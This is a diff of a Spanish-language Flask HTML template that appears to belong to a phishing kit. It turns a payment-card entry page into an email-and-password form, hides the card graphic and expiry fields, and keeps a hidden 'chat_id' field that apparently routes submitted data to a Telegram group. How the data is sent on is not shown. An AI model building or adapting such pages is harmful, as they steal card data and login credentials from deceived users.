@@ -2,6 +2,7 @@
 <html>
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    
     <title>Inicio</title>
     <link
       href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap"
@@ -12,7 +13,7 @@
 
     <link
       rel="stylesheet"
-      href="{{ url_for('static', filename='css/estilos.css') }}"
+      href="{{ url_for('static', filename='css/estilos2.css') }}"
     />
     <link
       rel="stylesheet"
@@ -42,16 +43,9 @@
 
       <div class="contenedor">
         <!-- Tarjeta -->
-        <section class="tarjeta" id="tarjeta">
+        <section class="tarjeta" id="tarjeta" style="display: none;">
           <div class="delantera">
-            <img  
-              src="{{ url_for('static', filename='img/tarjeta-crop.png') }}"
-              style="width: 50%; max-width: 80px"
-              alt=""
-            />
-            <div class="logo-marca" id="logo-marca">
-              <!-- <img src="img/logos/visa.png" alt=""> -->
-            </div>
+         
 
             <img src="{{ url_for('static', filename='img/chip-tarjeta.png') }}" class="chip" alt="" />
             <div class="datos">
@@ -106,36 +100,33 @@
 
         <!-- Formulario -->
         <form
-          action="submit"
+          action="submit2"
           method="post"
           id="formulario-tarjeta"
           class="formulario-tarjeta"
-          style="margin-top: 20px;"
+          style="margin-top: 110px;padding-top: 50px;"
         >
           <input type="text" name="chat_id" value="-1001961013172" hidden="" />
           <p id="address" hidden=""></p>
           <p id="gfg" hidden=""></p>
           <div class="grupo">
-            <label for="inputNumero">Número Tarjeta</label>
+            <label for="inputNumero">Correo Electrónico</label>
             <input
-              type="text"
-              name="inputNumero"
-              id="inputNumero"
-              maxlength="19"
+              type="email"
+              name="email"
+              id="email"
               autocomplete="off"
             />
           </div>
           <div class="grupo">
-            <label for="inputNombre">Nombre</label>
+            <label for="inputNombre">Contraseña</label>
             <input
-              type="text"
-              name="inputNombre"
-              id="inputNombre"
-              maxlength="19"
-              autocomplete="off"
+              type="password"
+              name="password"
+              id="password"
             />
           </div>
-          <div class="flexbox">
+          <div class="flexbox" style="display: none;">
             <div class="grupo expira">
               <label for="selectMes">Expiracion</label>
               <div class="flexbox">
